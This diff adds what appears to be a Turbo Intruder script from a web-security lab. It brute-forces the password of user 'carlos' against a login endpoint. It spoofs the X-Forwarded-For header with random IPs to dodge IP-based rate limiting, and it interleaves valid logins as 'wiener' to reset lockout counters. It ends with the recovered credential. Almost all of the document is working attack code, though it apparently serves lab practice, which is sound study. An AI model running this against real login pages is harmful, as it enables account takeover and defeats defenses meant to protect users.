@@ -1,0 +1,27 @@
+POST /login HTTP/1.1
+X-Forwarded-For: %s
+
+username=%s&password=%s
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+
+    for word in open('/tmp/auth-lab-passwords'):
+      engine.queue(target.req, [".".join(str(random.randint(0, 255)) for _ in range(4)), "carlos", word.rstrip()])
+      engine.queue(target.req, [".".join(str(random.randint(0, 255)) for _ in range(4)), "wiener", "peter"])
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status == 302:
+        table.add(req)
+
+
+POST /login HTTP/1.1
+
+username=carlos&password=123qwe
